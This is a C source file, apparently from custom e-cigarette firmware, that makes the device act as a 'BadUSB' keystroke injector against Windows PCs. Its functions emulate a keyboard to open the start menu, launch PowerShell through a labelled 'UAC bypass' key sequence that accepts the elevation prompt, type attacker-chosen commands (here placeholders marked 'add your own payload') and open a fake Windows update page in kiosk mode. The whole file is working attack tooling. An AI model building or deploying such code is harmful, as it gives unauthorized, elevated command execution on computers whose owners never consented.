#include "badusb.h"
#include "keyboard.h"
#include "dataflash.h"

void SendWindowsKey()
{
	KeyReport keys = { 0 };
	KeyReport reset = { 0 };

	keys.keys[0] = 0x29; // escape
	keys.modifiers = 0x1; // should be left shift
	KBD_SendRawReport(&keys);
	KBD_SendRawReport(&reset);

	// wait for start menu
	TIMER_Delay(TIMER0, 4000000);
}

void PressEnter()
{
	KeyReport keys = { 0 };
	KeyReport reset = { 0 };

	keys.keys[0] = 0x28; // enter
	KBD_SendRawReport(&keys);
	KBD_SendRawReport(&reset);

	TIMER_Delay(TIMER0, 1000000);
}

void ExecuteWithUACBypass()
{
	KeyReport keys = { 0 };
	KeyReport reset = { 0 };

	keys.keys[0] = 0x28; // enter
	keys.modifiers = 3; // ctrl and shift 0x11
	KBD_SendRawReport(&keys);
	KBD_SendRawReport(&reset);

	TIMER_Delay(TIMER0, 6000000);

	keys.keys[0] = 0x50; // left
	keys.modifiers = 0;
	KBD_SendRawReport(&keys);
	KBD_SendRawReport(&reset);

	TIMER_Delay(TIMER0, 1000000);

	keys.keys[0] = 0x28; // enter
	keys.modifiers = 0;
	KBD_SendRawReport(&keys);
	KBD_SendRawReport(&reset);

	TIMER_Delay(TIMER0, 3000000);
}

void Execute()
{
	KeyReport keys = { 0 };
	KeyReport reset = { 0 };

	keys.keys[0] = 0x28; // enter
	keys.modifiers = 0;
	KBD_SendRawReport(&keys);
	KBD_SendRawReport(&reset);

	TIMER_Delay(TIMER0, 3000000);
}

void FakeUpdate()
{
	SendWindowsKey();

	const char * launch_cmd = "iexplore -k http://fakeupdate.net/win10u/index.html";

	KBD_SendKeys(launch_cmd);

	Execute();

	dfStatus.keyboard = 0;
	dfStatus.storage = 0;
	dfStatus.vcom = 1;
	InitUSB();
}

void DownloadPowershell()
{
	SendWindowsKey();

	KBD_SendKeys("powershell"); // -windowstyle hidden

	ExecuteWithUACBypass();

    // TODO add your own payload here
	KBD_SendKeys("echo hello");

	PressEnter();

	// now switch to normal mode
	dfStatus.keyboard = 0;
	InitUSB();
}

void ExecPowershellFromStorage()
{
	SendWindowsKey();

    // TODO add your own payload here
	KBD_SendKeys("echo hello");

	ExecuteWithUACBypass();

	// now switch to storage mode
	dfStatus.storage = 1; // TODO actually map storage to flash
	InitUSB();
}

__myevic__ void BadUSB(int menuItemId)
{
	// Enter keyboard mode
	dfStatus.keyboard = 1;
	dfStatus.storage = 0;
	dfStatus.vcom = 0;
	InitUSB();

	TIMER_Delay(TIMER0, 6000000);

	switch (menuItemId)
	{
		case 0: 
			FakeUpdate();
			break;
		case 1:
			DownloadPowershell();
			break;
		case 2:
			ExecPowershellFromStorage();
			break;
		default:
			break;
	}

}